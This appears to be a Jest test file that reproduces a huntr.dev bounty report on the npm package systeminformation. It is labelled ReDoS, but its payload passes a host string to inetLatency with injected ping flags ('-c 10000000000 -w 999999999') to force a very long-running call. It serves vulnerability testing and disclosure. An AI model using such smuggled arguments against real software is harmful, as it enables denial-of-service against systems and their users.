//https://huntr.dev/bounties/1-npm-systeminformation/
test("ReDos in systeminformation", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const si = require('systeminformation');


    let t = measureTime(function () {
        si.inetLatency("-c 10000000000 -w 999999999 effectrenan.com").then((a) => { console.log(a) })

    });
    

    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
});
//problematic: lesser time